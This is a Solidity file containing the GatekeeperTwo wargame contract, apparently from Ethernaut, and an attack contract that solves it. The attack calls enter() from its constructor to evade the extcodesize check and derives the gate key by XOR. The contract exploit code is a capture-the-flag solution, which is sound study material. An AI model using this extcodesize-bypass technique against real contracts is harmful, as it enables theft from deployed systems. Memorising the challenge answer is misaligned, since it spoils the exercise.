
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Gatekeeper2Attack {
    GatekeeperTwo public gatekeeper2;

    constructor(address _gatekeeper2) {

        gatekeeper2 = GatekeeperTwo(_gatekeeper2);

        bytes8 gateKey = getGateKey(address(this));

        // During the constructor execution, extcodesize of the contract being deployed will be zero.
        gatekeeper2.enter(gateKey); // 在 constructor 中调用 enter()，extcodesize is 0

    }

    function getGateKey(address sender) internal pure returns (bytes8) { 
        uint64 maxUint64 = type(uint64).max;
        uint64 hashValue = uint64(bytes8(keccak256(abi.encodePacked(sender))));
        uint64 keyValue = maxUint64 ^ hashValue;
        return bytes8(keyValue);
    }
}  
     
